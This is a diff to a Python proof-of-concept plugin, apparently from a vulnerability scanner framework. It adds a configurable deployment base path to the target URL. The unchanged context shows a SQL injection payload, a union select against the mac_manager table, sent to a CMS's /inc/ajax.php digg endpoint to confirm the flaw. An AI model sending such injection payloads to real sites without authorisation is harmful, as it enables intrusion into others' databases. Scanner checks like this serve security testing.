@@ -26,8 +26,21 @@ class Poc(ABPoc):
 
     def __init__(self):
         super(Poc, self).__init__(Vuln())
-
+        self.option_schema = {
+            'properties': {
+                'base_path': {
+                    'type': 'string',
+                    'description': '部署路径',
+                    'default': '',
+                    '$default_ref': {
+                        'property': 'deploy_path'
+                    }
+                }
+            }
+        }
+                    
     def verify(self):
+        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
         vul_url = '%s/inc/ajax.php?ac=digg&ac2=&id=1&tab=vod+' % self.target
         payload = 'union+select/**/+null,md5(1231412414)+from+mac_manager+--%20'
         try:
